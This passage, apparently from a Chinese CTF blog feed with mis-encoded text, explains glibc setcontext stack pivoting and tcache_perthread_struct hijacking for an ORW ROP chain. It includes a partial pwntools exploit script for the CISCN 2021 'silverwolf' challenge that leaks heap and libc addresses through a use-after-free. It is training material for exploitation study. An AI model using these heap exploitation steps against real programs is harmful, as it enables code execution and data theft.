(fp);<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ vtable ä¸­çš„_IO_FINISHï¼Œå…¶å¯¹åº”çš„æ˜¯_IO_file_finish å‡½æ•°ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ free å‡½æ•°é‡Šæ”¾ä¹‹å‰åˆ†é…çš„ FILE ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FINISH (fp);<br></code></pre></td></tr></table></figure><h3 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf&#x2F;puts"></a>printf&#x2F;puts</h3><p>printf å’Œ puts æ˜¯å¸¸ç”¨çš„è¾“å‡ºå‡½æ•°ï¼Œåœ¨ printf çš„å‚æ•°æ˜¯ä»¥â€™\nâ€™ç»“æŸçš„çº¯å­—ç¬¦ä¸²æ—¶ï¼Œprintf ä¼šè¢«ä¼˜åŒ–ä¸º puts å‡½æ•°å¹¶å»é™¤æ¢è¡Œç¬¦ã€‚</p><p>puts åœ¨æºç ä¸­å®ç°çš„å‡½æ•°æ˜¯_IO_putsï¼Œè¿™ä¸ªå‡½æ•°çš„æ“ä½œä¸ fwrite çš„æµç¨‹å¤§è‡´ç›¸åŒï¼Œå‡½æ•°å†…éƒ¨åŒæ ·ä¼šè°ƒç”¨ vtable ä¸­çš„_IO_sputnï¼Œç»“æœä¼šæ‰§è¡Œ_IO_new_file_xsputnï¼Œæœ€åä¼šè°ƒç”¨åˆ°ç³»ç»Ÿæ¥å£ write å‡½æ•°ã€‚</p><p>printf çš„è°ƒç”¨æ ˆå›æº¯å¦‚ä¸‹ï¼ŒåŒæ ·æ˜¯é€šè¿‡_IO_file_xsputn å®ç°</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf">vfprintf+<span class="hljs-number">11</span><br><span class="hljs-variable">_IO_file_xsputn</span><br><span class="hljs-variable">_IO_file_overflow</span><br>funlockfile<br><span class="hljs-variable">_IO_file_write</span><br>write<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºåˆ©ç”¨setcontextæ‰“ORW</title>
    <link href="/2024/11/21/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8setcontext%E6%89%93ORW/"/>
    <url>/2024/11/21/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8setcontext%E6%89%93ORW/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºåˆ©ç”¨setcontextæ‰“ORW"><a href="#å…³äºåˆ©ç”¨setcontextæ‰“ORW" class="headerlink" title="å…³äºåˆ©ç”¨setcontextæ‰“ORW"></a>å…³äºåˆ©ç”¨setcontextæ‰“ORW</h1><h2 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h2><p>é‚£æ˜¯ä¸€ä¸ªæ˜æš—çš„æ™šä¸Šï¼Œæ—¶é—´å·²ç»9ï¼š30ã€‚æˆ‘æ‰‹è´±çš„å¼€äº†ä¸€ä¸ªé¢˜ï¼Œæ²¡æƒ³åˆ°è¿™é¢˜è®©æˆ‘å½»å¤œéš¾çœ ã€‚</p><h2 id="setcontextç®€ç»"><a href="#setcontextç®€ç»" class="headerlink" title="setcontextç®€ç»"></a>setcontextç®€ç»</h2><p>æºç åˆ†æ(2.27ç‰ˆæœ¬åŠå…¶ä»¥å‰)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">text:</span><span class="hljs-number">0000000000052180</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> <span class="hljs-comment">; =============== S U B R O U T I N E =======================================</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> <span class="hljs-comment">; __int64 __fastcall setcontext(__int64)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span>                 <span class="hljs-meta">public</span> setcontext <span class="hljs-comment">; weak</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> setcontext      proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: sub_587B0+Câ†“p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span>                                         <span class="hljs-comment">; DATA XREF: LOAD:0000000000009018â†‘o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052181</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">128h</span>] <span class="hljs-comment">; nset</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052188</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>        <span class="hljs-comment">; oset</span><br><span class="hljs-symbol">.text:</span>000000000005218A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">2</span>          <span class="hljs-comment">; how</span><br><span class="hljs-symbol">.text:</span>000000000005218F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-number">8</span>         <span class="hljs-comment">; sigsetsize</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052195</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span>000000000005219A                 <span class="hljs-keyword">syscall</span>                 <span class="hljs-comment">; LINUX - sys_rt_sigprocmask</span><br><span class="hljs-symbol">.text:</span>000000000005219C                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000005219D</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">0FFFFFFFFFFFFF001h</span><br><span class="hljs-symbol">.text:</span>00000000000521A3                 <span class="hljs-keyword">jnb</span>     short loc_52200<br><span class="hljs-symbol">.text:</span>00000000000521A5                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0E0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521AC                 <span class="hljs-keyword">fldenv</span>  <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-symbol">.text:</span>00000000000521AE                 <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">1C0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521B5                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsp</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0A0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521BC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">80h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521C3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">78h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521C7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">48h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521CB                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">50h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521CF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">58h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521D3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r15</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">60h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521D7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0A8h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521DE                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>00000000000521DF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">70h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521E3                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">88h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521EA                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">98h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">28h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F5                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r9</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">30h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F9                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">68h</span>]<br><span class="hljs-symbol">.text:</span>00000000000521F9 <span class="hljs-comment">; &#125; // starts at 52180</span><br><span class="hljs-symbol">.text:</span>00000000000521FD <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>00000000000521FD                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>00000000000521FF                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡rdiå¯„å­˜å™¨è¿›è¡Œèµ‹å€¼æ“ä½œï¼Œå¯¹äºglibc-2.27ç‰ˆæœ¬æˆ‘ä»¬é€šå¸¸ä»setcontext + 53 å¼€å§‹ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ mov  rsp, [rdi+0A0h] é‚£ä¸€è¡Œï¼Œåœ¨é˜…è¯»å…¶ä»–å¸ˆå‚…çš„æ–‡ç« åçŸ¥é“æ˜¯å› ä¸ºä¸Šé¢çš„ fldenv byte pte [rcx] ä¼šé€ æˆç¨‹åºæ‰§è¡Œæ—¶ç›´æ¥ crashã€‚</p><p>è¿™é‡Œä¸€å…±æœ‰ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯ç»™rspèµ‹å€¼è¿›è¡Œæ ˆè¿ç§»ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ä¸€ä¸ªpushæ“ä½œè¿›è¡Œå‹æ ˆã€‚é€šè¿‡è¿™ä¸¤ä¸ªæˆ‘ä»¬æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="åŠ«æŒtcache-perthread-structç»“æ„ä½“"><a href="#åŠ«æŒtcache-perthread-structç»“æ„ä½“" class="headerlink" title="åŠ«æŒtcache_perthread_structç»“æ„ä½“"></a>åŠ«æŒtcache_perthread_structç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure><p>å †åœ°å€çš„ç¬¬ä¸€ä¸ªchunkï¼š</p><p>tcache_perthread_structçš„chunkå¤´ï¼š0x11å­—èŠ‚<br>countsæ•°ç»„ä¸€å…±å ç”¨64å­—èŠ‚,æ¯ä¸ªå­—èŠ‚å¯¹åº”ç€ä¸€ä¸ªé“¾è¡¨,ç”¨æ¥å­˜æ”¾å¯¹åº”é“¾è¡¨ä¸­å­˜æ”¾ç€chunkçš„æ•°é‡ 0x40å­—èŠ‚<br>entryæŒ‡é’ˆæ•°ç»„æ˜¯ç”¨æ¥å­˜å‚¨æ¯ä¸ªé“¾è¡¨ä¸­é“¾è¡¨å¤´çš„chunkåœ°å€ï¼Œä¸€å…±å ç”¨8 * 64å­—èŠ‚ 0x200å­—èŠ‚</p><p>æ­£å¥½0x251å­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412102017952.png" alt="image-20241210201758837"></p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>æ§åˆ¶countsæ•°ç»„ï¼Œè®©tcachebinsæ•°é‡æ”¹å˜ï¼Œä»è€Œè¾¾åˆ°ä¸€å®šæ•ˆæœã€‚ä¾‹ï¼šä¼ªé€ tcacheä¸ºå †åŸºåœ°å€+0x10ï¼Œä¹Ÿå°±æ˜¯é¦–ä¸ªchunkï¼Œç„¶åæ”¹å˜0x250å¤§å°çš„chunkæ•°é‡ä¸º7ï¼Œå°±å¯ä»¥é‡Šæ”¾ä¼ªé€ chunkè¿›å…¥unsortebinä»è€Œæ³„éœ²libcåŸºåœ°å€</li><li>æ§åˆ¶enetryæŒ‡é’ˆæ•°ç»„ï¼Œç”³è¯·ç›¸åº”å¤§å°chunkåˆ°æŒ‡å®šä½ç½®ï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™çš„ç›®çš„</li></ol><h3 id="åˆ›å»ºæˆ–è€…é‡Šæ”¾chunkç»†èŠ‚"><a href="#åˆ›å»ºæˆ–è€…é‡Šæ”¾chunkç»†èŠ‚" class="headerlink" title="åˆ›å»ºæˆ–è€…é‡Šæ”¾chunkç»†èŠ‚"></a>åˆ›å»ºæˆ–è€…é‡Šæ”¾chunkç»†èŠ‚</h3><p>å½“ä½ åˆ›å»ºæˆ–è€…é‡Šæ”¾ä¸€ä¸ªchunkæ—¶ï¼Œæ­¤æ—¶rdiæŒ‡é’ˆæŒ‡å‘chunkçš„åœ°å€</p><h2 id="setcontextæ‰“orwæ”»å‡»æ€è·¯"><a href="#setcontextæ‰“orwæ”»å‡»æ€è·¯" class="headerlink" title="setcontextæ‰“orwæ”»å‡»æ€è·¯"></a>setcontextæ‰“orwæ”»å‡»æ€è·¯</h2><h3 id="ä»¥free-hookå¸ƒç½®ROPé“¾"><a href="#ä»¥free-hookå¸ƒç½®ROPé“¾" class="headerlink" title="ä»¥free_hookå¸ƒç½®ROPé“¾"></a>ä»¥free_hookå¸ƒç½®ROPé“¾</h3><p>é€šè¿‡æ§åˆ¶eneryæ•°ç»„ï¼Œæ¥æ§åˆ¶è¾“å…¥ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411211307142.png" alt="image-20241121130717082"></p><p>æœ€åå¸ƒç½®stack_pivot_1ç„¶åfreeæ‰ï¼Œå°±ä¼šå¯åŠ¨ROPé“¾</p><p>æ‰§è¡Œæµç¨‹ä¸ºï¼š</p><ol><li>freeæ‰chunkè°ƒç”¨setcontextï¼Œæ­¤æ—¶rdiæŒ‡å‘addr</li><li>mov     rsp, [rdi+0A0h]æŠŠrspæŒ‡å‘ORW1å¤„ï¼Œmov     rcx, [rdi+0A8h]  push  rcxæŠŠretå‹æ ˆ</li><li>setcontextç»“æŸç›´æ¥retï¼Œå°±èƒ½åˆ°ORW1æ‰§è¡ŒROP</li></ol><h2 id="ä¾‹é¢˜è®²è§£"><a href="#ä¾‹é¢˜è®²è§£" class="headerlink" title="ä¾‹é¢˜è®²è§£"></a>ä¾‹é¢˜è®²è§£</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/silverwolf.zip">[CISCN 2021 åˆèµ›]silverwolf</a></p><p>æœ¬é¢˜åªèƒ½æ“ä½œå½“å‰chunkï¼Œå¹¶ä¸”æœ‰ä¸ªUAFï¼Œæ‰€ä»¥è¦æƒ³æ³„éœ²libcåœ°å€ï¼Œéœ€è¦æ”¹countsæ•°ç»„æ•°é‡ä¸º7ï¼Œç„¶åfreeæ‰æ‰èƒ½æ³„éœ²libcåœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./silverwolf&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.allocate                                                                                                            </span><br><span class="hljs-string">2.edit                                                                                                                </span><br><span class="hljs-string">3. show</span><br><span class="hljs-string">4. delete</span><br><span class="hljs-string">5. exit</span><br><span class="hljs-string">Your choice: </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span> , content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>  p.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>() :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice: &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br> <br>add(<span class="hljs-number">0x78</span>)<br>free()<br>show()  <span class="hljs-comment">#UAFæ³„éœ²heapåœ°å€</span><br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x11b0</span><br><br>edit(p64(heap_base + <span class="hljs-number">0x10</span>))  <span class="hljs-comment">#åŠ«æŒtcache_perthread_struct</span><br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br>edit(p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x7000000</span>))  <span class="hljs-comment">#æ§åˆ¶0x250å¤§å°çš„chunkæ•°é‡ä¸º7</span><br>free()  <span class="hljs-comment">#è¿›å…¥unsertbins</span><br>show()<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>edit(p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><br>pop_rax = libc_base + <span class="hljs-number">0x43AE8</span><br>pop_rdi = libc_base + <span class="hljs-number">0x215BF</span><br>pop_rsi = libc_base + <span class="hljs-number">0x23EEA</span><br>pop_rdx = libc_base + <span class="hljs-number">0x1B96</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>syscall = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + <span class="hljs-number">0xf</span><br>flag_addr = heap_base + <span class="hljs-number">0x1000</span><br>ret = libc_base + <span class="hljs-number">0x8AA</span><br><br>orw1 = heap_base + <span class="hljs-number">0x3000</span><br>orw2 = heap_base + <span 